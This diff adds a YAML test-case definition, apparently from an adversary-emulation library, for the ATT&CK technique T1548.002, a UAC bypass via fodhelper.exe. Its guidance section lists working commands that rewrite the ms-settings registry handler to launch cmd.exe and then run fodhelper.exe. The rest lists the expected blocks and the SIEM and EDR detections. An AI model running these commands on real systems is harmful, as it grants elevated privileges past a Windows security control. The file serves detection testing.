@@ -1,0 +1,28 @@
+name: Bypass User Account Control (UAC) via fodhelper
+description: Bypass user account control (UAC) to move to a high-integrity execution context via fodhelper.exe and a Registry modification
+metadata:
+  isv: 1
+  tactic: TA0004
+  tid: T1548.002
+  x_vectr_id: 8c06191e-8c03-4b97-8c18-e28cde39fda5
+  x_references:
+  - https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/
+  x_guidance_id: 89052297-16d7-402f-98bc-6aa7273ec042#1
+platforms:
+- windows
+guidance:
+- cmd> reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /f
+- cmd> reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /d "C:\windows\system32\cmd.exe" /f
+- cmd> reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /d "" /f
+- cmd> c:\windows\system32\fodhelper.exe
+block:
+- Suspicious process execution/behavior blocked by endpoint security tool
+detect:
+- Suspicious process execution/behavior is detected by endpoint security tool or triggers alert in SIEM based on telemetry
+- Suspicious Windows registry modifications detected in the SIEM using Windows system events
+logs:
+- winevent
+- edr:telemetry
+controls:
+- SIEM
+- Endpoint Protection
